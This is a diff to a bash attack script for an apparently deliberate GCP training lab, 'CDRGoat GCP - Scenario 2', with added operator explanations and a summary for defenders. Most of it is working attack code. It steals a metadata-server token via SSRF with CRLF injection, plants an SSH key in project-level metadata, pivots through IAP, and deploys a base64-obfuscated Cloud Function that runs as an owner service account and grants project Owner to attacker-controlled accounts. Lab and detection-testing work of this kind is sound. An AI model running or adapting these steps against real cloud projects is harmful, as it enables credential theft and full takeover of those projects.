@@ -43,15 +43,14 @@ spin_start() {
 spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }
 
 banner() {
-  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 2              ===" "${RESET}"
+  printf "%s%s%s\n" "${BOLD}${CYAN}" "===          CDRGoat GCP - Scenario 2                ===" "${RESET}"
   printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
   printf "  • Step 1. Exploitation of SSRF+CRLF, metadata stealing\n"
   printf "  • Step 2. Permission enumeration for stolen metadata\n"
   printf "  • Step 3. Access via compute.instances.setMetadata\n"
   printf "  • Step 4. Review Role and Permissions assigned on VMb\n"
   printf "  • Step 5. Cloud function execution and new privs verification\n"
-  printf "  • Step 6. Removing items we created during compromitation\n"
-
+  printf "  • Step 6. Cleanup\n"
 }
 banner
 
@@ -152,6 +151,21 @@ chmod 600 "$ENVFILE"
 printf "\n"
 ok "Identified project_id = ${YELLOW}${PROJECT_ID}${RESET}. Configuration ${YELLOW}${CFG}${RESET} is set and stored in ${YELLOW}${ENVFILE}${RESET}"
 
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "We exploited a ${MAGENTA}Server-Side Request Forgery (SSRF)${RESET} vulnerability combined\n"
+printf "with ${MAGENTA}CRLF injection${RESET} to access the GCP Metadata Server.\n\n"
+printf "The CRLF injection (%%0D%%0A) allowed us to inject the required header:\n"
+printf "  ${CYAN}Metadata-Flavor: Google${RESET}\n\n"
+printf "Without this header, GCP's metadata server rejects requests — a security\n"
+printf "control designed to prevent SSRF attacks. However, CRLF injection bypasses it.\n\n"
+printf "We obtained:\n"
+printf "  • ${MAGENTA}Access Token${RESET}: OAuth2 token for GCP API authentication\n"
+printf "  • ${MAGENTA}Project ID${RESET}: Target GCP project identifier\n\n"
+printf "This token has ${YELLOW}'cloud-platform'${RESET} scope, granting broad API access.\n\n"
+
 read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 ################################################################################
@@ -174,11 +188,11 @@ try() {
   fi
 }
 
-printf "GCP tokens work a bit different comparing with AWS but similar to Azure. We may check the area of possible token usage (scope) via requesting tokeninfo.\n"
+step "Checking token scope via tokeninfo endpoint"
 source $ENVFILE
-curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GOOGLE_ACCESS_TOKEN}"   | jq
-printf "\nOur scope is ${YELLOW}'cloud-platform'${RESET}. It gives us permissions to interact with any GCP API which means we may try to enumerate permisions in for every existed services.\n\n"
+curl -s "https://oauth2.googleapis.com/tokeninfo?access_token=${GOOGLE_ACCESS_TOKEN}" | jq
 
+step "Enumerating permissions across GCP services"
 try "Compute: list instances" gcloud compute instances list
 gcloud compute instances list --filter="name~^streamgoat"
 try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a --zone="us-central1-a"
@@ -192,8 +206,21 @@ try "Pubsub: list topics" gcloud pubsub topics list
 try "BigQuery: list datasets" gcloud bigquery datasets list
 try "CloudSQL: list sql instances" gcloud sql instances list
 
+ok "New compute resource detected: ${YELLOW}streamgoat-vm-b${RESET}"
 
-printf "\nDuring recon and initial priv enumiration new compute resource was detected - ${YELLOW}streamgoat-vm-b${RESET}\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "The token scope is ${YELLOW}'cloud-platform'${RESET}, which grants broad API access.\n"
+printf "We systematically enumerated permissions across multiple GCP services.\n\n"
+printf "Key findings from enumeration:\n"
+printf "  • ${GREEN}[OK]${RESET} Compute Engine — can list and describe VMs\n"
+printf "  • ${GREEN}[OK]${RESET} Cloud Functions — can list functions\n"
+printf "  • ${GREEN}[OK]${RESET} IAM — can list service accounts\n\n"
+printf "We discovered another VM: ${YELLOW}streamgoat-vm-b${RESET}\n"
+printf "Next: Attempt to gain access via metadata manipulation.\n\n"
+
 read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
@@ -201,7 +228,7 @@ read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..."
 #############################################
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 3. Access via compute.instances.setMetadata  ===" "${RESET}"
 
-printf "\nOn step 2 we identified a few 'list' privilegies for compute service. Now we will try to check if we may modify MetaData to get access to the hosts.\n"
+step "Attempting to modify metadata for SSH access"
 
 KEY_DIR="/tmp/.streamgoat"
 KEY_FILE="${KEY_DIR}/temp_ssh_key"
@@ -227,12 +254,11 @@ spin_stop
 if [ "$SSH_UPLOAD" -eq 0 ]; then
   ok  "MetaData successfully updated!"
 else
-  err "MetaData wasn't updated"
+  err "MetaData wasn't updated — instance-level metadata blocked"
+  info "Attempting project-level metadata instead..."
 fi
 
-read -r -p "We can not upload ssh-key into metadata of instance but let's check if there is a chance to modify project level metadata and get RCE via ${YELLOW}'roles/compute.osLogin'${RESET} permission. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
-printf "\n"
-printf "${MAGENTA}[>] Attempting to update Project MetaData and upload SSH key${RESET}\n"
+step "Attempting to update Project-level Metadata with SSH key"
 spin_start ""
 set +e
 gcloud compute project-info add-metadata --metadata="ssh-keys=${SSH_METADATA}"
@@ -263,6 +289,20 @@ else
   exit 8
 fi
 
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "Instance-level metadata modification was blocked, but ${YELLOW}project-level${RESET}\n"
+printf "metadata modification succeeded.\n\n"
+printf "GCP metadata hierarchy:\n"
+printf "  • ${MAGENTA}Instance metadata${RESET}: Applies to a single VM only\n"
+printf "  • ${MAGENTA}Project metadata${RESET}: Applies to ALL VMs in the project\n\n"
+printf "We used ${CYAN}compute.project-info.add-metadata${RESET} to inject our SSH key\n"
+printf "at the project level, then connected via IAP tunneling.\n\n"
+printf "IAP (Identity-Aware Proxy) tunneling allows SSH access to VMs without\n"
+printf "public IPs, using the user's GCP credentials for authentication.\n\n"
+
 read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
 
 #############################################
@@ -271,13 +311,28 @@ read -r -p "Step 3 is completed. Press Enter to proceed (or Ctrl+C to abort)..."
 
 printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 4. Review Role and Permissions assigned on VMb  ===" "${RESET}"
 
-printf "\nLet's use same method of permission enumirations we did on step 2 for VMa.\n"
+step "Enumerating permissions from VMb's service account"
 
 gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='echo "dHJ5KCkgewogIGxvY2FsIGRlc2M9IiQxIjsgc2hpZnQKICBsb2NhbCBvdXRwdXQKICBzZXQgK2UKICBvdXRwdXQ9JCgiJEAiIDI+JjEpCiAgcmM9JD8KICBzZXQgLWUKICBpZiBbWyAkcmMgLWVxIDAgJiYgJG91dHB1dCAhPSAqIlJlcXVpcmVkIiogXV07IHRoZW4KICAgIHByaW50ZiAiWyVzXSBbT0tdICAgICVzXG4iICIkKGRhdGUgKyVIOiVNOiVTKSIgIiRkZXNjIgogIGVsc2UKICAgIHByaW50ZiAiWyVzXSBbREVOWV0gICVzXG4iICIkKGRhdGUgKyVIOiVNOiVTKSIgIiRkZXNjIgogIGZpCn0KCnRyeSAiQ29tcHV0ZTogbGlzdCBpbnN0YW5jZXMiIGdjbG91ZCBjb21wdXRlIGluc3RhbmNlcyBsaXN0CnRyeSAiQ29tcHV0ZTogZ2V0IGluc3RhbmNlcyBpbmZvIiBnY2xvdWQgY29tcHV0ZSBpbnN0YW5jZXMgZGVzY3JpYmUgc3RyZWFtZ29hdC12bS1hIC0tem9uZT0idXMtY2VudHJhbDEtYSIKdHJ5ICJJQU06IGxpc3Qgc2VydmljZS1hY2NvdW50cyIgZ2Nsb3VkIGlhbSBzZXJ2aWNlLWFjY291bnRzIGxpc3QKZ2Nsb3VkIGlhbSBzZXJ2aWNlLWFjY291bnRzIGxpc3QgLS1maWx0ZXI9ImVtYWlsOnN0cmVhbWdvYXQiIC0tZm9ybWF0PSJ0YWJsZShlbWFpbCwgZGlzcGxheU5hbWUpIgp0cnkgIkZ1bmN0aW9uczogbGlzdCBmdW5jdGlvbnMiIGdjbG91ZCBmdW5jdGlvbnMgbGlzdApnY2xvdWQgZnVuY3Rpb25zIGxpc3QgLS1maWx0ZXI9Im5hbWU6c3RyZWFtZ29hdCIKdHJ5ICJCdWNrZXRzOiBsaXN0IGJ1Y2tldHMiIGdjbG91ZCBzdG9yYWdlIGJ1Y2tldHMgbGlzdAp0cnkgIkxvZ2dpbmc6IGxpc3Qgc2lua3MiIGdjbG91ZCBsb2dnaW5nIHNpbmtzIGxpc3QKdHJ5ICJTZWNyZXRzOiBsaXN0IHNlY3JldHMiIGdjbG91ZCBzZWNyZXRzIGxpc3QKdHJ5ICJBcHAgc2VydmljZXM6IGxpc3QgYXBwIHNlcnZpY2VzIiBnY2xvdWQgYXBwIHNlcnZpY2VzIGxpc3QKdHJ5ICJQdWJzdWI6IGxpc3QgdG9waWNzIiBnY2xvdWQgcHVic3ViIHRvcGljcyBsaXN0CnRyeSAiQmlnUXVlcnk6IGxpc3QgZGF0YXNldHMiIGdjbG91ZCBiaWdxdWVyeSBkYXRhc2V0cyBsaXN0CnRyeSAiQ2xvdWRTUUw6IGxpc3Qgc3FsIGluc3RhbmNlcyIgZ2Nsb3VkIHNxbCBpbnN0YW5jZXMgbGlzdAo=" | base64 -d | bash' 2>&1
 
-printf "\nWe may notice new set of permissions given: list IAM roles and list fuctions. There is a posiblity that it isn't just list operation but wildcard roles which may allow create/invoke funcitons and which is more important assign a Service Account to this function. In our enumeration we see that there is some SA called 'owner'. It may has full admin permissions udner the project.\nTo sum up, our plan is:\n  1. Create function which will assign Owner role to Service Account we already control (assigned to VMa and VMb)\n  2. Set 'streamgoat-owner-sa' Service Account to this function\n  3. Execute the function\n  4. Check if VMa permisions got changed\n\n"
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "VMb has a different service account with additional permissions:\n"
+printf "  • ${GREEN}[OK]${RESET} IAM: list service accounts\n"
+printf "  • ${GREEN}[OK]${RESET} Cloud Functions: list functions\n\n"
+printf "We discovered a service account named ${YELLOW}'streamgoat-owner-sa'${RESET}.\n"
+printf "This account likely has elevated privileges (possibly Owner role).\n\n"
+printf "Our privilege escalation plan:\n"
+printf "  1. Create a Cloud Function with malicious code\n"
+printf "  2. Assign ${YELLOW}'streamgoat-owner-sa'${RESET} as the function's service account\n"
+printf "  3. Execute the function to modify IAM policy\n"
+printf "  4. Grant Owner role to our controlled service accounts\n\n"
+printf "This exploits the ${MAGENTA}iam.serviceAccounts.actAs${RESET} permission, which allows\n"
+printf "impersonating a service account when deploying Cloud Functions.\n\n"
 
-printf "${MAGENTA}[>] Attempting to create function${RESET}\n"
+step "Creating privilege escalation Cloud Function"
 spin_start ""
 set +e
 gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='echo "aW1wb3J0IGZ1bmN0aW9uc19mcmFtZXdvcmsKZnJvbSBnb29nbGVhcGljbGllbnQgaW1wb3J0IGRpc2NvdmVyeQppbXBvcnQgZ29vZ2xlLmF1dGgKCkBmdW5jdGlvbnNfZnJhbWV3b3JrLmh0dHAKZGVmIGVsZXZhdGVfc2VydmljZV9hY2NvdW50cyhyZXF1ZXN0KToKICAgIHByb2plY3RfaWQgPSAiQUFBQUEtdG8tYmUtcmVwbGFjZWQtQUFBQUEiCiAgICB0YXJnZXRzID0gWwogICAgICAgIGYic2VydmljZUFjY291bnQ6c3RyZWFtZ29hdC12bWEtc2FAe3Byb2plY3RfaWR9LmlhbS5nc2VydmljZWFjY291bnQuY29tIiwKICAgICAgICBmInNlcnZpY2VBY2NvdW50OnN0cmVhbWdvYXQtdm1iLXNhQHtwcm9qZWN0X2lkfS5pYW0uZ3NlcnZpY2VhY2NvdW50LmNvbSIKICAgIF0KCiAgICBjcmVkZW50aWFscywgXyA9IGdvb2dsZS5hdXRoLmRlZmF1bHQoKQogICAgY3JtX3NlcnZpY2UgPSBkaXNjb3ZlcnkuYnVpbGQoImNsb3VkcmVzb3VyY2VtYW5hZ2VyIiwgInYxIiwgY3JlZGVudGlhbHM9Y3JlZGVudGlhbHMpCgogICAgcG9saWN5ID0gY3JtX3NlcnZpY2UucHJvamVjdHMoKS5nZXRJYW1Qb2xpY3kocmVzb3VyY2U9cHJvamVjdF9pZCwgYm9keT17fSkuZXhlY3V0ZSgpCgogICAgYmluZGluZ3MgPSBwb2xpY3kuZ2V0KCJiaW5kaW5ncyIsIFtdKQoKICAgICMgQ2hlY2sgaWYgYWxyZWFkeSBhZGRlZAogICAgb3duZXJfYmluZGluZyA9IG5leHQoKGIgZm9yIGIgaW4gYmluZGluZ3MgaWYgYlsicm9sZSJdID09ICJyb2xlcy9vd25lciIpLCBOb25lKQogICAgaWYgbm90IG93bmVyX2JpbmRpbmc6CiAgICAgICAgb3duZXJfYmluZGluZyA9IHsicm9sZSI6ICJyb2xlcy9vd25lciIsICJtZW1iZXJzIjogW119CiAgICAgICAgYmluZGluZ3MuYXBwZW5kKG93bmVyX2JpbmRpbmcpCgogICAgZm9yIHRhcmdldCBpbiB0YXJnZXRzOgogICAgICAgIGlmIHRhcmdldCBub3QgaW4gb3duZXJfYmluZGluZ1sibWVtYmVycyJdOgogICAgICAgICAgICBvd25lcl9iaW5kaW5nWyJtZW1iZXJzIl0uYXBwZW5kKHRhcmdldCkKCiAgICAjIFNldCB1cGRhdGVkIHBvbGljeQogICAgc2V0X3BvbGljeV9yZXF1ZXN0ID0gewogICAgICAgICJwb2xpY3kiOiB7CiAgICAgICAgICAgICJiaW5kaW5ncyI6IGJpbmRpbmdzLAogICAgICAgICAgICAiZXRhZyI6IHBvbGljeS5nZXQoImV0YWciKQogICAgICAgIH0KICAgIH0KCiAgICBjcm1fc2VydmljZS5wcm9qZWN0cygpLnNldElhbVBvbGljeShyZXNvdXJjZT1wcm9qZWN0X2lkLCBib2R5PXNldF9wb2xpY3lfcmVxdWVzdCkuZXhlY3V0ZSgpCgogICAgcmV0dXJuICJTdWNjZXNzOiBFbGV2YXRlZCByb2xlcyBmb3IgdGFyZ2V0IHNlcnZpY2UgYWNjb3VudHNcbiIK" | base64 -d > main.py && PROJECT_ID=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/project-id") && sed -i "s/AAAAA-to-be-replaced-AAAAA/${PROJECT_ID}/g" main.py && echo "ZnVuY3Rpb25zLWZyYW1ld29yawpnb29nbGUtYXBpLXB5dGhvbi1jbGllbnQKZ29vZ2xlLWF1dGgK" | base64 -d > requirements.txt && gcloud functions deploy streamgoat-escalation --quiet --verbosity=none --runtime=python311 --trigger-http --entry-point=elevate_service_accounts --region=us-central1 --service-account=streamgoat-owner-sa@${PROJECT_ID}.iam.gserviceaccount.com --no-allow-unauthenticated >/dev/null 2>&1' 2>&1
@@ -314,11 +369,9 @@ read -r -p "Step 4 is completed. Press Enter to proceed (or Ctrl+C to abort)..."
 # Step 5. Cloud function execution and new privs verification
 #############################################
 
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Cloud function execution and new privs verification  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 5. Cloud function execution and privilege verification  ===" "${RESET}"
 
-printf "\nWe are going to assign Onwer role to Service Accounts we already controlled: ${YELLOW}streamgoat-vma-sa${RESET} and ${YELLOW}streamgoat-vmb-sa${RESET}\n"
-
-step "Cloud function execution"
+step "Executing privilege escalation function"
 spin_start "Attempting to execute function"
 set +e
 FUNC_EXEC=$(gcloud compute ssh streamgoat_attacker@streamgoat-vm-b --tunnel-through-iap --verbosity=error --quiet --ssh-key-file=$KEY_FILE --zone="us-central1-a" --command='gcloud functions call streamgoat-escalation' 2>&1)
@@ -328,15 +381,14 @@ spin_stop
 
 if [ "$FUNC_EXEC_CODE" -eq 0 ]; then
   ok "Function has been executed:"
-  printf "%s\n\n" "$FUNC_EXEC"
-  read -r -p "Now we should become an Owner of the project. Let's verify our permisions via the same enumiration method we did on step 2. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+  printf "%s\n" "$FUNC_EXEC"
 else
   err "Function execution failed (exit code: $FUNC_EXEC_CODE)"
   echo "$FUNC_EXEC"
   exit 8
 fi
 
-step "Verification of new permissions"
+step "Verification of new permissions (should now be Owner)"
 try "Compute: list instances" gcloud compute instances list
 try "Compute: get instances info" gcloud compute instances describe streamgoat-vm-a --zone="us-central1-a"
 try "IAM: list service-accounts" gcloud iam service-accounts list
@@ -347,13 +399,52 @@ try "Secrets: list secrets" gcloud secrets list
 try "Pubsub: list topics" gcloud pubsub topics list
 try "CloudSQL: list sql instances" gcloud sql instances list
 
-read -r -p "Step 5 is completed. We are Owner. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+#############################################
+# Operator explanation
+#############################################
+printf "\n%s%s%s\n\n" "${BOLD}" "---  OPERATOR EXPLANATION  ---" "${RESET}"
+printf "The Cloud Function successfully executed with ${YELLOW}'streamgoat-owner-sa'${RESET} identity.\n"
+printf "The function modified the project IAM policy to grant ${RED}Owner${RESET} role to our\n"
+printf "controlled service accounts (VMa and VMb).\n\n"
+printf "This is a critical privilege escalation technique in GCP:\n"
+printf "  1. Attacker has ${CYAN}cloudfunctions.functions.create${RESET}\n"
+printf "  2. Attacker has ${CYAN}iam.serviceAccounts.actAs${RESET} on a privileged SA\n"
+printf "  3. Deploy function that runs as the privileged SA\n"
+printf "  4. Function modifies IAM to elevate attacker's permissions\n\n"
+printf "We now have ${RED}Owner${RESET} access to the entire GCP project.\n\n"
+
+read -r -p "Step 5 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
+
+################################################################################
+# Final Summary
+################################################################################
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Attack Simulation Complete  ===" "${RESET}"
+
+printf "\n%s%s%s\n" "${BOLD}${GREEN}" "Attack chain executed:" "${RESET}"
+printf "  1. Exploited SSRF+CRLF vulnerability to access metadata server\n"
+printf "  2. Harvested GCP access token with cloud-platform scope\n"
+printf "  3. Enumerated permissions and discovered VMb\n"
+printf "  4. Injected SSH key via project-level metadata\n"
+printf "  5. Pivoted to VMb and discovered additional permissions\n"
+printf "  6. Created Cloud Function with privileged service account\n"
+printf "  7. Executed function to escalate to project Owner\n\n"
+
+printf "%s%s%s\n" "${BOLD}${RED}" "Impact:" "${RESET}"
+printf "  • Full Owner access to GCP project\n"
+printf "  • Ability to access/modify all resources\n"
+printf "  • IAM policy manipulation capability\n\n"
+
+printf "%s\n" "Defenders should monitor for:"
+printf "  • SSRF attempts to metadata.google.internal\n"
+printf "  • SSH key additions to project metadata\n"
+printf "  • Cloud Function deployments with privileged SAs\n"
+printf "  • IAM policy changes granting Owner/Editor roles\n\n"
 
 # ==============
 # Cleanup
 # ==============
 
-printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Removing items we created during compromitation (metadata, cloud function, local temporary files)  ===" "${RESET}"
+printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Cleanup  ===" "${RESET}"
 
 set +e
 step "Removing ssh-key we created on project metadata level (for user streamgoat_attacker)"
@@ -364,6 +455,6 @@ gcloud compute project-info add-metadata --quiet --metadata-from-file ssh-keys=/
 step "Removing cloud function we created (streamgoat-escalation)"
 gcloud functions delete streamgoat-escalation --quiet
 
-step "Removing localy stored file in /tmp/.streamgoat"
+step "Removing locally stored files in /tmp/.streamgoat"
 rm -rf /tmp/.streamgoat
 set -e
